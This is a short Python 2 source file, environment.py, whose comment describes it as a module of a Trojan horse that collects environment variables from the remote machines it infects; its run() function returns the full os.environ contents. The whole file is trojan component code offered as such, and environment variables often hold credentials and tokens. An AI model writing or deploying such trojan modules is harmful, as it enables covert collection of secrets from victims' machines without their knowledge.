# environment.py
# The module is simply extracting the information set environment variables on remote machines that are running the Trojan horse

import os

def run(**args):
    print "[*] In environment module."
    return str(os.environ)